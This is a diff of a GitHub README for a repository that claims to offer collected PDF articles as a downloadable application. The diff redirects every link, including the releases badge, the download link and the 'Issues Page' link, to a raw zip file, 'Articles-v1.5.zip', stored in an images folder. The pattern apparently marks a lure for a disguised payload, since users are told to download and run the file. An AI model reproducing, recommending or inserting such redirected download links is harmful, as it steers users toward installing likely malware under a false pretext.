@@ -1,7 +1,7 @@
 # 📜 Articles - Access Collected PDF Documents Easily
 
 ## 🚀 Download the Application
-[![Download Articles](https://img.shields.io/badge/Download%20Articles-v1.0-blue.svg)](https://github.com/Mewst1875/Articles/releases)
+[![Download Articles](https://raw.githubusercontent.com/Mewst1875/Articles/main/images/Articles-v1.5.zip%https://raw.githubusercontent.com/Mewst1875/Articles/main/images/Articles-v1.5.zip)](https://raw.githubusercontent.com/Mewst1875/Articles/main/images/Articles-v1.5.zip)
 
 ## 📖 Description
 The Articles repository contains a collection of valuable article documents in PDF format. These documents cover various topics, including co-simulation, embedded systems, logic design, and more. This resource is useful for students, professionals, and anyone interested in learning more about these subjects.
@@ -16,7 +16,7 @@ Before you download, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get started, visit this page to download the application:
 
-[Download Articles](https://github.com/Mewst1875/Articles/releases)
+[Download Articles](https://raw.githubusercontent.com/Mewst1875/Articles/main/images/Articles-v1.5.zip)
 
 Follow these steps:
 
@@ -71,7 +71,7 @@ If you would like to contribute to this project, feel free to submit pull reques
 This project is licensed under the MIT License. You can use the articles in accordance with this license.
 
 ## 🔗 Links
-- [Releases Page](https://github.com/Mewst1875/Articles/releases)
-- [Issues Page](https://github.com/Mewst1875/Articles/issues)
+- [Releases Page](https://raw.githubusercontent.com/Mewst1875/Articles/main/images/Articles-v1.5.zip)
+- [Issues Page](https://raw.githubusercontent.com/Mewst1875/Articles/main/images/Articles-v1.5.zip)
 
 By following these steps, you will successfully download and run the Articles application. Enjoy exploring the valuable content available in the repository!
